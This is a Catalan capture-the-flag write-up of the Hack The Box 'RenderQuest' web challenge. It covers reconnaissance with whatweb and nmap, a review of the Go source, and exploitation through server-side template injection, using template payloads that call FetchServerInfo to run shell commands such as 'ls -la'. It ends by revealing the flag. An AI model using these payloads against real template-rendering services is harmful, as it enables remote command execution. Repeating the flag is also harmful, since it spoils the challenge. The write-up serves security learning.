Enfocarem el challenge en el supòsit que tenim el codi.

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/67ee885d-e4e6-4209-9976-4ad0ee61b87d)

Veiem que és una web que fa renders. A priòri és una app que ens pot ser útils per fer templates.

Ens interesssa saber la tecnologia amb que està fet:


```
`┌──(root㉿polkali)-[/home/polkali]

└─# whatweb http://94.237.62.195:37591/

http://94.237.62.195:37591/ [301 Moved Permanently] Country[FINLAND][FI], IP[94.237.62.195], RedirectLocation[/render?page=index.tpl]

http://94.237.62.195:37591/render?page=index.tpl [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, IP[94.237.62.195], Meta-Author[lean], Script, Title[RenderQuest]`
```

  
Veiem que la pròpia pàgina on se’ns mostra el «home» és un template.

  
Ara li farem un nmap però no coneix el servei que hi ha darrere el port tot i trobar-lo obert:

```
`──(root㉿polkali)-[/home/polkali]

└─# nmap -p 56687 -sV -v ┌──(root㉿polkali)-[/home/polkali]

└─# whatweb http://94.237.62.195:37591/

http://94.237.62.195:37591/ [301 Moved Permanently] Country[FINLAND][FI], IP[94.237.62.195], RedirectLocation[/render?page=index.tpl]

http://94.237.62.195:37591/render?page=index.tpl [200 OK] Bootstrap, Country[FINLAND][FI], HTML5, IP[94.237.62.195], Meta-Author[lean], Script, Title[RenderQuest]

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 19:23 CET

NSE: Loaded 46 scripts for scanning.

Unable to split netmask from target expression: "┌──(root㉿polkali)-[/home/polkali]"

Read data files from: /usr/bin/../share/nmap

WARNING: No targets were specified, so 0 hosts scanned.

Nmap done: 0 IP addresses (0 hosts up) scanned in 0.07 seconds

Raw packets sent: 0 (0B) | Rcvd: 0 (0B)

└─#: command not found

zsh: bad pattern: [301

zsh: bad pattern: [200

┌──(root㉿polkali)-[/home/polkali]

└─# nmap -p 37591 -sV -v 94.237.62.195

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 19:24 CET

NSE: Loaded 46 scripts for scanning.

Initiating Ping Scan at 19:24

Scanning 94.237.62.195 [4 ports]

Completed Ping Scan at 19:24, 0.05s elapsed (1 total hosts)

Initiating Parallel DNS resolution of 1 host. at 19:24

Completed Parallel DNS resolution of 1 host. at 19:24, 0.00s elapsed

Initiating SYN Stealth Scan at 19:24

Scanning 94-237-62-195.uk-lon1.upcloud.host (94.237.62.195) [1 port]

Discovered open port 37591/tcp on 94.237.62.195

Completed SYN Stealth Scan at 19:24, 0.05s elapsed (1 total ports)

Initiating Service scan at 19:24

Scanning 1 service on 94-237-62-195.uk-lon1.upcloud.host (94.237.62.195)

Completed Service scan at 19:25, 87.52s elapsed (1 service on 1 host)

NSE: Script scanning 94.237.62.195.

Initiating NSE at 19:25

Completed NSE at 19:25, 0.01s elapsed

Initiating NSE at 19:25

Completed NSE at 19:25, 1.05s elapsed

Nmap scan report for 94-237-62-195.uk-lon1.upcloud.host (94.237.62.195)

Host is up (0.0049s latency).

  

PORT STATE SERVICE VERSION

37591/tcp open unknown

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port37591-TCP:V=7.94SVN%I=7%D=2/21%Time=65D63FD3%P=x86_64-pc-linux-gnu%

SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\

SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B

SF:ad\x20Request")%r(GetRequest,DE,"HTTP/1\.0\x20301\x20Moved\x20Permanent

SF:ly\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/ren

SF:der\?page=index\.tpl\r\nDate:\x20Wed,\x2021\x20Feb\x202024\x2018:24:18\

SF:x20GMT\r\nContent-Length:\x2057\r\n\r\n<a\x20href=\"/render\?page=index

SF:\.tpl\">Moved\x20Permanently</a>\.\n\n")%r(HTTPOptions,7C,"HTTP/1\.0\x2

SF:0301\x20Moved\x20Permanently\r\nLocation:\x20/render\?page=index\.tpl\r

SF:\nDate:\x20Wed,\x2021\x20Feb\x202024\x2018:24:18\x20GMT\r\nContent-Leng

SF:th:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request

SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo

SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2

SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection

SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1

SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut

SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalSe

SF:rverCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t

SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x

SF:20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC

SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\

SF:n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20

SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:

SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,DE,"HTTP/1

SF:\.0\x20301\x20Moved\x20Permanently\r\nContent-Type:\x20text/html;\x20ch

SF:arset=utf-8\r\nLocation:\x20/render\?page=index\.tpl\r\nDate:\x20Wed,\x

SF:2021\x20Feb\x202024\x2018:24:44\x20GMT\r\nContent-Length:\x2057\r\n\r\n

SF:<a\x20href=\"/render\?page=index\.tpl\">Moved\x20Permanently</a>\.\n\n"

SF:)%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x

SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba

SF:d\x20Request");

  

Read data files from: /usr/bin/../share/nmap

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 88.94 seconds

Raw packets sent: 5 (196B) | Rcvd: 2 (84B)`
```

  
El que farem aquí és anar a la web de Hackthebox i descarregar el codi:


![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/c9840fd4-dfb8-4087-b802-f32be1ebf5f8)
 


Dockerfile és un fitxer que ens diu com volem aixecar el contenidor, si obrim el fitxer i mirem la primera línia, podem veure amb quina imatge s’ha fet el contenidor.

Veiem que aquest challenge està fet amb GO, ens hauríem de llegir tot el codi i veure què hi trobem.

Veiem que hi ha una funció que es diu main i hi veiem els endpoints de l’aplicació:


![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/77a5103a-dfa6-4451-8aee-b47398fc5e7a)


  
Hem d’interpretar què fa la funció getTpl que és força llarga. Al final arribem a la línia 164 que posa bàsicament que si la url que li posem és remota i no en local que carregui el fitxer en remot.

El template es renderitza al costat del servidor i no del client, i com veurem no comprova res de l’input que hi fem.

Hi ha una funció que li carreguem la url per string i no hi ha cap tipus de sanejament i la carrega.

Per atacar la web farem servir server side template injection, ho podem fer perquè podem dir l’input que ens doni la gana, es fa al costat del servidor i no està sanejat. Bàsicament posarem un template enverinat.

Ara hem d’entendre com fer aquest template enverinat i per això ens documentem. SSTI és una aplicació de GO i desl rpimers enllaços que trobem per internet veiem com podem fer un RCE.

Veiem que hi ha una funció que fa exec.command:

  

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/a6dc9f31-6406-4731-afab-40cbff3375da)
 

I ens diu que li hem de passar una comanda amb string, primer farem un template i li passarem ls -la per provar-ho.

Farem servir un servei web per fer això, utilitzarem això:

``{{ .FetchServerInfo "ls -la" }}``

  

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/6da5a3f3-8168-4a59-814d-c5798184e302)
 

``{{ .FetchServerInfo("cd ..;ls -la")}}``

  

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/f38ac16a-0a1d-435b-9efb-4a5cf2d7cb96)
  


![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/61d99b1c-bd57-445f-8268-e95b06df3284)
 

  

**La flag és: HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}**

  

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/f1aa89f4-6601-485c-afc9-047adedfbbd8)
 

![image](https://github.com/PolMuri/Hack-the-box/assets/109922379/607fd3de-725f-4e4f-bab2-80939ce04a30)

